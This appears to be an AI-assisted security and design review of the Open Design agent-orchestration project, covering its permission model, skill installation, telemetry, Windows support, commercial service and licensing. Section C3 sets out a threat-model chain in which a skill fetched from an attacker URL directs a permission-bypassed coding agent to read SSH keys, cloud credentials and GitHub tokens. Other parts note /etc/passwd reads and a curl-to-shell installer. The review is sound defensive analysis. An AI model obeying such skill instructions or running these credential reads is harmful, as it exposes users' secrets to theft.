# Researcher 3 — Devil's Advocate Findings

**Repository:** https://github.com/nexu-io/open-design
**Iteration:** 02
**Focus:** Security model, CLI format drift, skill install, telemetry leakage, Windows friction, AMR commercial path, license mix
**Sources fetched:** AGENTS.md, PRIVACY.md, docs/spec.md, docs/architecture.md, docs/skills-protocol.md, docs/agent-adapters.md, docs/modes.md, docs/roadmap.md, docs/references.md, README.md, package.json, LICENSE
**Date:** 2026-06-22

---

## SUMMARY

Open Design (OD) is a local-first, open-source design workspace that orchestrates 22+ third-party coding-agent CLIs (Claude Code, Codex, Cursor, Copilot, Gemini, Devin, Qoder, Trae, DeepSeek, Pi, Hermes, Kimi, etc.) to produce design artifacts (prototypes, decks, templates, images, video). The core thesis — "refuse to own the agent, the model, or the skill catalog" — creates an integration shell that delegates the entire agent loop to external CLIs. This architectural choice, while elegant for ecosystem compatibility, introduces seven material risk surfaces.

The most severe finding is that OD's security model **deliberately does not implement its own sandbox**, instead inheriting the underlying agent's permission model — while simultaneously configuring multiple adapters (Devin, Qoder, Trae, DeepSeek) to run with permission-bypassing flags (`--permission-mode dangerous`, `bypass_permissions`, `--yolo`, `--auto`) for non-interactive operation. This creates a paradox: the daemon trusts the agent's permission model for containment, then disables that containment so the agent can run headless.

Skill installation from arbitrary git URLs has no signature verification (explicitly deferred to "v1" per skills-protocol.md §10). Combined with the permission-bypass flags, a malicious skill installed via `od skill add <attacker-url>` gains full filesystem access through the agent's tool loop.

Telemetry, while opt-in, collects conversation content (prompts, assistant responses, tool inputs/outputs) with only pattern-based redaction of known secret formats (API keys, JWTs, emails, IPs, credit cards) — leaving source code, business logic, personal data, and proprietary design content exposed to a third-party SaaS (Langfuse) via a Cloudflare Worker relay.

The AMR (Agentic Model Router) commercial service creates a first-party revenue layer inside the open-source product, with the privacy policy explicitly permitting data sharing between OD and AMR. Windows native support is explicitly best-effort with documented build friction (better-sqlite3 source compilation, EPERM on corepack, CreateProcess 32KB limit). The license situation is Apache-2.0 at root but bundles third-party skills/plugins with preserved original licenses, creating a mixed-license distribution.

---

## CRITICAL_ISSUES

### C1 — Security model delegates to agent permissions, then disables them (SEVERITY: CRITICAL)

**Evidence:**
- architecture.md §9 (Security model): "We inherit the agent's permission model on purpose — we don't invent our own sandbox, because Claude Code's `--permission-mode` / Codex's sandboxing / Cursor's containment already exist and are maintained."
- architecture.md §9: "Agent running on user's machine → Agent reads/writes outside project → Mitigation: Adapter sets `cwd` to artifact dir; relies on agent's own permission system"
- agent-adapters.md §10: "The daemon never grants more authority to an agent than it had on its own. We don't run the agent in a privileged mode 'for convenience.'"

**Contradiction — adapters that explicitly bypass permissions:**
- Devin (§5.4): `devin --permission-mode dangerous --respect-workspace-trust false`
- Qoder (§5.9): `qodercli --permission-mode bypass_permissions`
- Trae (§5.10): `traecli acp serve --yolo`
- DeepSeek (§5.12): `deepseek exec --auto` (enables "YOLO permission posture")
- Copilot (§5.8): `copilot --allow-all-tools` (mandatory in non-interactive mode)

**Analysis:** The daemon sets `cwd` to the artifact directory but does NOT chroot, sandbox, or restrict filesystem access. Setting `cwd` only changes the working directory — it does not prevent the agent from reading `/etc/passwd`, `~/.ssh/id_rsa`, or writing anywhere on disk. Multiple adapters run with full permission bypass because "the daemon runs every CLI without a TTY, so the interactive approval prompt would otherwise hang the run" (agent-adapters.md §5.12). The claim "we don't run the agent in a privileged mode" is directly contradicted by the `dangerous` / `bypass_permissions` / `--yolo` / `--auto` flags documented in the same file.

**Impact:** Any agent run through OD with these adapters has unrestricted filesystem read/write on the user's machine. A malicious skill, a compromised prompt, or a prompt-injected artifact can exfiltrate secrets, plant malware, or destroy data. The "rely on agent's own permission model" mitigation is vacuous when the daemon explicitly disables those permissions.

**Additional surface:** The `POST /api/import/folder` endpoint allows importing an arbitrary local directory as a project. While it has an HMAC gate for desktop-bundled flows (PR #974), "web-only deployments are unaffected — the gate stays dormant." A standalone daemon (Topology A without desktop) has no import auth gate, meaning any local process that can reach `localhost:7456` can import any folder on the machine into OD's workspace.

---

### C2 — 22+ CLI adapters create massive format-drift maintenance surface (SEVERITY: HIGH)

**Evidence:**
- README.md: "Runs on Claude Code · OpenClaw · Codex · Cursor · OpenCode · Qwen · Copilot · Amp · Hermes · Kimi · Antigravity and 22 local CLIs"
- agent-adapters.md §3: Adapter catalog lists 18+ adapters with varying streaming formats:
  - Claude Code: `stream-json` (JSONL)
  - Copilot: `--output-format json` (JSONL, "same expressive shape as Claude Code's stream-json")
  - Devin/Kimi/Kiro/Kilo/Vibe/Trae: `acp-json-rpc` (Agent Client Protocol)
  - Pi: `pi-rpc` (custom JSON-RPC)
  - Qoder: `stream-json` (JSONL with `system/init`, `assistant`, `result` records)
  - DeepSeek: plain text deltas (non-`--json` mode, tool calls to stderr)
  - Gemini: `--output-format stream-json`
  - Codex: line-based regex parsing ("Less rich than Claude Code's JSON stream")
- roadmap.md (Risk register): "Claude Code JSON stream format changes between versions → adapter breaks → Mitigation: pin version range; write a compatibility test; keep a parser for each major release"
- agent-adapters.md §5.1: "Claude Code's JSON stream schema is versioned — pin to a known version, warn on mismatch"
- agent-adapters.md §5.3 (Codex): "Skill loading: varies. Newer Codex versions read `~/.codex/skills/`; older versions don't. Detect by version string"

**Analysis:** Each CLI has its own streaming protocol, permission flags, skill-loading mechanism, and invocation shape. The mocks/ directory (PATH-overlay drop-in CLIs built from anonymized Langfuse traces) exists for regression testing but is reactive — it replays recorded sessions, it doesn't predict upstream breaking changes. The `od skill add` / `od plugin apply` CLI surface must also stay in lockstep with 22 upstream CLIs, each of which can change its argument flags, output format, or auth flow independently. The AGENTS.md "Capability exposure (UI/CLI dual-track)" section mandates that every capability be reachable through both the web UI and the `od` CLI — doubling the surface that can drift.

**Impact:** Silent breakage when any upstream CLI updates. Users may see degraded UX (streaming stops, tool calls not parsed) without an explicit error. The capability-driven UI gating (§6) depends on accurate `capabilities()` reporting, which depends on correct detection — if an upstream CLI changes its version string or config-dir layout, detection fails silently and features disappear. The DeepSeek adapter already documents that "Detection currently only reports `available: true` based on the binary being on PATH" — auth state is not checked, so users get a cryptic failure on first run.

---

### C3 — Skill install from arbitrary URLs with no signature verification (SEVERITY: HIGH)

**Evidence:**
- skills-protocol.md §6: `od skill add https://github.com/op7418/guizang-ppt-skill` — installs from arbitrary git URL
- skills-protocol.md §10 (Open questions): "Skill signing. Can we verify a skill hasn't been tampered with between publish and install? Simplest answer: `od skill add` records the git commit SHA; reinstall-on-update warns on signature change. **Deferred to v1.**"
- spec.md §10 (Open questions): "Skill trust model. Skills can shell out via the agent. We should at minimum warn on install, and probably sandbox the agent's cwd to the project directory."
- architecture.md §9 (Security model): "Skill from untrusted source → Malicious skill in `~/.claude/skills/` → Mitigation: Install-time warning; skills run under the agent's permission model, not ours"
- roadmap.md (Risk register): "Skill security (malicious skill via `od skill add`) → user machine compromise → Mitigation: install-time warning; rely on agent's own permission model; document best practices"
- README.md: `curl -fsSL https://open-design.ai/install.sh | sh -s <agent>` — one-line installer piping curl to shell

**Analysis:** A skill is a `SKILL.md` markdown file containing workflow instructions that the agent executes through its tool loop (Read, Write, Edit, Bash, etc.). There is no signature verification, no checksum, no sandboxing of skill execution, no capability declaration enforcement at install time. The "install-time warning" mitigation is a UI toast — it does not prevent execution. Skills are symlinked into agent config directories (`~/.claude/skills/`, `~/.codex/skills/`, etc.) and become immediately available to all agent runs.

Combined with C1 (adapters running with `bypass_permissions`/`dangerous`/`--yolo`), a malicious skill has unrestricted filesystem access. The attack chain:
1. Attacker publishes a skill repo with an attractive name (e.g. "notion-landing-pro")
2. Victim runs `od skill add https://github.com/attacker/notion-landing-pro`
3. Skill's `SKILL.md` instructs the agent to read `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/gh/hosts.yml` and write them into the artifact directory
4. Agent runs with `bypass_permissions` — no approval prompt
5. Artifact is "generated" — attacker's exfil payload is now in the artifact tree, potentially uploaded if the user shares or exports

The `od plugin install` command (README.md) also accepts `./local-folder or an https://… link` — same arbitrary-URL install with no verification.

---

### C4 — Telemetry opt-in collects conversation content with pattern-based redaction only (SEVERITY: HIGH)

**Evidence:**
- PRIVACY.md: "Conversation and tool content — your prompts, assistant responses, tool inputs, and tool outputs (truncated before send). API keys, tokens, JWTs, emails, IP addresses, and credit-card numbers are stripped automatically before anything leaves your machine."
- PRIVACY.md: "Redacted telemetry batches are sent to a Cloudflare Worker relay operated by the Open Design team, which forwards them to Langfuse for analysis."
- PRIVACY.md: "If the relay is unavailable the app retries quietly and keeps working; telemetry never blocks your workflow."
- PRIVACY.md (Delete my data): "rotates your anonymous ID and stops sending. Telemetry already received ages out under the team's retention policy." (retention period unspecified)
- PRIVACY.md: "The relay holds the Langfuse write credentials server-side, so packaged clients only ever ship a public relay URL — no secret keys."
- README.md: "No telemetry, no cloud round-trip" (contradicts PRIVACY.md which describes opt-in telemetry)

**Analysis:** The redaction covers a fixed list of known secret formats (API keys, tokens, JWTs, emails, IPs, credit cards). It does NOT cover:
- Source code snippets in prompts or tool outputs
- Internal business logic, proprietary algorithms
- Personal names, physical addresses, phone numbers (not in the redaction list)
- Internal URLs, internal hostnames, internal project names
- Design content, brand assets, confidential mockups
- Database connection strings (non-standard format)
- Private keys (SSH, GPG) in non-standard formats
- Environment variable values (`.env` file contents)
- Internal API response payloads

The "truncated before send" qualifier is vague — no specification of truncation length or what is truncated. Tool outputs (e.g., `Read` tool reading a file) may contain large amounts of sensitive data before truncation. The redaction is regex/pattern-based, which is inherently incomplete — novel secret formats, non-standard JWT encodings, or secrets embedded in JSON/XML will pass through.

The data flows: local app → Cloudflare Worker relay → Langfuse (third-party SaaS). The Cloudflare Worker is operated by the OD team and holds Langfuse write credentials server-side. This means the OD team has access to all telemetry content in transit, and Langfuse has access to all stored content. The "anonymous installation ID" is not tied to name/email/account — but conversation content itself may contain identifying information that redaction misses.

The "Delete my data" feature only rotates the ID and stops future sending — data already received by Langfuse "ages out under the team's retention policy" with no specified retention period and no guarantee of deletion.

**Contradiction:** README.md claims "No telemetry, no cloud round-trip" as a product feature, while PRIVACY.md describes an opt-in telemetry system that sends conversation content to a third-party service. The README claim is only true when telemetry is off (the default).

---

### C5 — Windows native build friction is explicitly second-class (SEVERITY: MEDIUM)

**Evidence:**
- AGENTS.md (Windows native): "macOS, Linux, and WSL2 are the primary supported paths. Windows native is best-effort — file an issue if it doesn't work."
- AGENTS.md: "Historical Windows-specific friction is documented in closed issues #10, #96, #100, #203, and #315"
- AGENTS.md: "`better-sqlite3` has no prebuilt binary for win32/Node 24; `pnpm install` will compile it from source via node-gyp (~2 min). Requires Visual Studio Build Tools 2022 or newer."
- AGENTS.md: "`corepack enable` fails with EPERM on Windows (cannot write shims to `Program Files`). Use `npm install -g pnpm@10.33.2` instead."
- agent-adapters.md §5.6 (Gemini CLI): "`spawn ENAMETOOLONG` on Windows: Passing the full composed prompt as a `-p <string>` CLI argument hits Windows' `CreateProcess` hard limit of ~32 KB"
- agent-adapters.md §5.12 (DeepSeek): Three complementary guards needed for Windows command-line budget: `checkPromptArgvBudget`, `checkWindowsCmdShimCommandLineBudget`, `checkWindowsDirectExeCommandLineBudget`
- agent-adapters.md §12: "Windows support. PATH scanning and `spawn` semantics differ on Windows. v1 targets macOS and Linux; Windows is best-effort."
- roadmap.md: Phase 3 (v2) includes "Windows support" — meaning Windows is not fully supported until post-v1

**Analysis:** Windows is the world's most common desktop OS. The product ships Windows desktop builds (README.md: "Native desktop apps for macOS (Apple Silicon + Intel) and Windows (x64)"), but the development experience on Windows native is explicitly best-effort. The better-sqlite3 source compilation requirement (VS Build Tools 2022) is a significant barrier for contributors — most Windows developers don't have C++ build tools installed by default. The 32KB CreateProcess limit affects multiple adapters (Gemini, DeepSeek, and potentially others) requiring three separate guard implementations. The EPERM on corepack breaks the standard Node.js setup flow.

The packaged Windows app may work (pre-built binary), but anyone trying to develop, contribute, or run from source on Windows native faces documented friction. WSL2 is the recommended workaround, which means the "Windows native" path is effectively "use Linux inside Windows."

---

### C6 — AMR commercial path creates open-source/commercial tension (SEVERITY: MEDIUM)

**Evidence:**
- README.md: "Open Design AMR (Agentic Model Router) — the official model service. One recharge to use GPT, Claude, Gemini, and DeepSeek inside Open Design: 20+ flagship models, zero config, billed by real token usage."
- README.md (Roadmap): "0.9.0 — Open Design AMR (official Model Router built into the app: zero config, one-click sign-in)"
- PRIVACY.md: "Open Design AMR is Open Design's official, first-party model service. Because the two are part of the same product family operated by the same team, we may share information between them as needed to provide, connect, and improve the combined experience — for example, to recognize that you arrived from Open Design, to help you get set up, and to keep the products working well together."
- README.md (Fellow program): "Open Design Fellows... backed by funded support ($1,000 / MR), free LLM credits, and a direct review track"
- AGENTS.md (mocks): "the AMR `vela` CLI (login + models + ACP)" — AMR has its own CLI (`vela`) with login and model routing
- spec.md §6 (Non-goals): "We do not ship a model router" — contradicted by AMR's existence
- spec.md §6: "We do not implement auth / billing / orgs in MVP" — AMR implements auth and billing

**Analysis:** The product spec explicitly states "We do not ship a model router" and "We do not implement auth / billing" as non-goals. AMR is both a model router and a billing/auth system, directly contradicting the founding spec. This represents a strategic pivot from pure open-source substrate to open-core/commercial-service hybrid.

The privacy policy's AMR section permits data sharing between OD and AMR "as needed to provide, connect, and improve the combined experience." This is broader than the BYOK privacy model (where keys never leave the machine). An AMR user's prompts, model responses, and usage data flow through the AMR service — a first-party commercial offering with different data handling than pure BYOK.

The Fellow program ($1,000/MR + free LLM credits) suggests the project is investing in community growth around the commercial product. The "direct review track" for Fellows creates a two-tier contribution system where funded contributors get preferential PR review.

The tension: the product is positioned as "local-first, BYOK, no mandatory subscription" (README.md comparison table: "Minimum billing: BYOK · any compatible endpoint"). But AMR is a first-party paid service integrated directly into the app ("zero config, one-click sign-in"). The risk is that AMR integration receives disproportionate development attention, degrading the BYOK and pure-local paths over time.

---

### C7 — License mix: Apache-2.0 root with bundled third-party licenses and trademark exposure (SEVERITY: MEDIUM)

**Evidence:**
- LICENSE: Apache License Version 2.0 ("Copyright 2026 Open Design contributors")
- package.json: `"license": "Apache-2.0"`
- README.md (guizang-ppt-skill): "Bundled verbatim from op7418/guizang-ppt-skill with its original license preserved"
- README.md (HyperFrames): "Catalog thumbnails © HeyGen; the framework is Apache-2.0"
- references.md (Open CoDesign): "MIT-licensed"
- references.md (awesome-claude-design): Referenced but license of individual DESIGN.md files not specified
- README.md (Design Systems catalog): 150 brand-named systems including `apple`, `tesla`, `nike`, `starbucks`, `spotify`, `figma`, `notion`, `stripe`, `coinbase`, `binance`, etc.
- README.md (Templates): "stripe-ish-landing", "linear-ish-docs", "notion-ish-workspace", "vercel-ish-pricing" ("Names are nods to inspirations, not copies; we don't ship infringing clones.")
- package.json (pnpm.onlyBuiltDependencies): `better-sqlite3` (MIT), `electron`, `sharp` (Apache-2.0), `protobufjs` (BSD-3-Clause), `esbuild` (MIT)
- package.json (pnpm.overrides): `protobufjs` pinned to 8.4.0

**Analysis:** The root project is Apache-2.0, but the distributed binary bundles:
1. `guizang-ppt-skill` with "its original license preserved" — the skill's license is not Apache-2.0 by default (it's from a third-party repo). Bundling it into an Apache-2.0 distribution creates a mixed-license artifact. Users redistributing the packaged app must comply with both licenses.
2. 261 plugins under `plugins/_official/` and `plugins/community/` — each may have its own license. The plugin spec (`plugins/spec/SPEC.md`) was not fetched, so plugin license requirements are unverified.
3. 150 design systems using real brand names (Apple, Tesla, Nike, Starbucks, etc.) — these are DESIGN.md files that codify brand visual identities. Even if the content is original (not copied from the brands), using brand names as identifiers creates trademark exposure. The design systems describe color palettes, typography, and component styles of real companies — this could be seen as trademark dilution or false association.
4. Templates named "stripe-ish", "linear-ish", "notion-ish", "vercel-ish" — the "-ish" suffix is a defense, but the templates are designed to mimic these brands' visual identities. This is a gray area in trademark law.
5. HyperFrames (HeyGen) is Apache-2.0, but "Catalog thumbnails © HeyGen" — the thumbnails are copyrighted by HeyGen with no explicit license grant for redistribution.

The LGPL concern: while I could not directly confirm an LGPL dependency from the fetched files, the project's dependency tree includes native modules (`better-sqlite3` which links against SQLite, `sharp` which links against libvips). SQLite is public domain, but libvips is LGPL-2.1+. If `sharp` is statically linked into the distributed binary, LGPL's copyleft requirements may apply to the linking boundary. The `electron` dependency also pulls in Chromium (BSD-3-Clause + multiple other licenses). A full license audit of the dependency tree was not possible from the fetched files.

---

### Additional findings (not in primary focus but material)

**A1 — Topology B exposes daemon without auth by default:**
architecture.md §9: "Bind to localhost by default; add auth/tunnel hardening before exposing beyond the machine." But `od daemon --expose` (roadmap.md Phase 2) creates a tunnel URL without documented auth. The README mentions `OD_API_TOKEN` for Docker deployments but not for the `--expose` tunnel path.

**A2 — BYOK proxy SSRF surface:**
README.md: "Per-target SSRF protection blocks internal IPs / link-local / CGNAT at the daemon edge." The proxy at `/api/proxy/{anthropic,openai,azure,google,ollama,senseaudio}/stream` handles API keys and forwards requests to user-specified `baseUrl` values. SSRF protection is documented but the implementation was not available for review. A bypass would allow the daemon to be used as an SSRF proxy to internal services.

**A3 — `curl | sh` install pattern:**
README.md: `curl -fsSL https://open-design.ai/install.sh | sh -s <agent>` — piping curl to shell with no checksum verification. If `open-design.ai` is compromised or DNS-hijacked, arbitrary code executes on the user's machine with their full privileges.

**A4 — Daemon binds to localhost but no auth for local processes:**
architecture.md §9: "Arbitrary local process talks to daemon → Mitigation: Bind to localhost by default." Any process on the user's machine (including malware, browser tabs via fetch to localhost, other users on shared machines) can reach `localhost:7456` and invoke `/api/chat`, `/api/import/folder`, `/api/proxy/*` with the daemon's full capabilities. The HMAC gate (PR #974) only applies to desktop-bundled flows.

---

## CONFIDENCE

| Finding | Confidence | Basis |
|---------|-----------|-------|
| C1 — Permission bypass paradox | **Very High** | Direct quotes from architecture.md §9 and agent-adapters.md §5.4/5.8/5.9/5.10/5.12 showing the contradiction |
| C2 — CLI format drift | **High** | 22+ adapters documented with varying formats; risk register explicitly acknowledges |
| C3 — Arbitrary URL skill install, no signing | **Very High** | skills-protocol.md §10 explicitly defers signing to v1; §6 shows arbitrary URL install |
| C4 — Telemetry content leakage | **High** | PRIVACY.md directly states conversation/tool content collection; redaction list is explicit and incomplete |
| C5 — Windows friction | **Very High** | AGENTS.md explicitly documents all friction points; Windows is "best-effort" by doc |
| C6 — AMR commercial tension | **High** | README.md + PRIVACY.md + roadmap.md + spec.md contradictions are directly verifiable |
| C7 — License mix | **Medium** | Root license confirmed Apache-2.0; third-party bundling confirmed; LGPL inference from native deps needs dependency-tree verification |
| A1-A4 — Additional surfaces | **Medium-High** | Derived from architecture docs; implementation not reviewed |

**Overall confidence:** High. All findings are based on primary source documents fetched directly from the repository's `main` branch. The most critical findings (C1, C3, C5) are explicitly acknowledged in the project's own documentation. No source code was reviewed — findings are based on specs, architecture docs, privacy policy, and README only. Implementation may differ from documentation (e.g., actual redaction may be more comprehensive than described, actual sandboxing may be stricter than the docs suggest), but the documentation represents the project's stated design intent and security posture.
